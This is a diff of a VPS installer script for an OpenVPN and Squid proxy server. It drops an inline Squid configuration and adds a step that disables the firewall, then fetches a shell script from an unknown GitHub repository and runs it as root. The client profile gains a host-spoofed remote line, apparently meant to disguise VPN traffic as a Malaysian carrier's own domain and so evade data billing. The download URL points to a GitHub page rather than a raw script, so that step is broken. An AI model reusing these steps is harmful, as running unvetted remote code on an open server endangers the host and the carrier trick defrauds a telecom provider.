@@ -38,44 +38,10 @@ wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/ara-ranger
 sed -i 's/listen = \/var\/run\/php7.0-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php/7.0/fpm/pool.d/www.conf
 service php7.0-fpm restart
 
-# install squid
-apt-get -y install squid
-cat > /etc/squid/squid.conf <<-END
-acl server dst xxxxxxxxx/32 localhost
-acl checker src 188.93.95.137
-acl ports_ port 14 22 53 21 8080 8081 8000 3128 1193 1194 440 441 442 443 80
-http_port 3128
-http_port 8000
-http_port 8080
-http_port 8888
-access_log none
-cache_log /dev/null
-logfile_rotate 0
-http_access allow server
-http_access allow checker
-http_access deny all
-forwarded_for off
-via off
-request_header_access Host allow all
-request_header_access Content-Length allow all
-request_header_access Content-Type allow all
-request_header_access All deny all
-hierarchy_stoplist cgi-bin ?
-coredump_dir /var/spool/squid
-refresh_pattern ^ftp: 1440 20% 10080
-refresh_pattern ^gopher: 1440 0% 1440
-refresh_pattern -i (/cgi-bin/|\?) 0 0% 0
-refresh_pattern . 0 20% 4320
-visible_hostname dopekid.tk
-END
-sed -i $MYIP2 /etc/squid/squid.conf;
-service squid restart
-
-
 apt-get -y install openvpn
 cd /etc/openvpn/ 
 
- # Creating server.conf, ca.crt, server.crt and server.key
+ # Creating server.conf, ca.crt, ver.crt and server.key
  cat <<'myOpenVPNconf1' > /etc/openvpn/servertcp.conf
 # GakodScript
 
@@ -524,8 +490,9 @@ cat <<EOF152> /home/vps/public_html/tcp.ovpn
 # Credits to Gakod Memgganas
 client
 dev tun
+proto tcp
 setenv FRIENDLY_NAME "I'M MASTA GAKOD"
-remote $MYIP 443 tcp
+remote $MYIP:443@devvault.digi.com.my
 http-proxy $MYIP 8080
 resolv-retry infinite
 route-method exe
@@ -675,6 +642,11 @@ COMMIT
 END
 ufw status
 ufw disable
+
+wget https://github.com/89870must73/z/blob/main/squid.sh
+chmod +x squid.sh
+./squid.sh
+
 
 # download script
 cd
